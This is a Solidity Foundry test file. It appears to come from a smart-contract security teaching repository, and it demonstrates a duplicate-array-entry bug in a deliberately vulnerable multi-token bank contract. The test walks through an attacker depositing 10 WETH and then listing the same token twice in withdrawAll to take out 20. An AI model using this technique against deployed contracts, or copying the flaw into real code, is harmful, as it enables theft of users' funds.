// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console2} from "../../lib/forge-std/src/Test.sol";
import {ERC20Mock} from "../../lib/openzeppelin-contracts/contracts/mocks/ERC20Mock.sol";
import {VulnerableMultiTokenBank} from "../../src/array-duplicates/array-duplicates.sol";
import {FixedMultiTokenBank} from "../../src/array-duplicates/array-duplicates-fixed.sol";

contract TestDuplicates is Test {
    VulnerableMultiTokenBank public vulnerableBank;
    FixedMultiTokenBank public fixedBank;
    ERC20Mock public weth;

    address public attacker = makeAddr("attacker");

    function setUp() public {
        weth = new ERC20Mock();

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);

        vulnerableBank = new VulnerableMultiTokenBank(tokens);
        weth.mint(address(vulnerableBank), 100e18);

        // fixedBank = new FixedMultiTokenBank(tokens);
        // weth.mint(address(fixedBank), 100e18);

        weth.mint(attacker, 10e18);
    }

    function testWithdrawAllDuplicates() public {
        console2.log("Before withdraw WETH balance: ", weth.balanceOf(attacker));
        vm.startPrank(attacker);

        // deposit
        address[] memory tokensToDeposit = new address[](1);
        tokensToDeposit[0] = address(weth);
        uint256[] memory amountsToDeposit = new uint256[](1);
        amountsToDeposit[0] = 10e18;
        weth.approve(address(vulnerableBank), 10e18);
        vulnerableBank.deposit(amountsToDeposit, tokensToDeposit);

        // withdraw
        address[] memory tokensToWithdraw = new address[](2);
        tokensToWithdraw[0] = address(weth);
        tokensToWithdraw[1] = address(weth);
        vulnerableBank.withdrawAll(tokensToWithdraw);

        // assert attacker was able to steal
        assertEq(weth.balanceOf(attacker), 20e18);
        console2.log("After withdraw WETH balance: ", weth.balanceOf(attacker));

        vm.stopPrank();
    }

    // function testWithdrawAllDuplicatesFixed() public {}
}
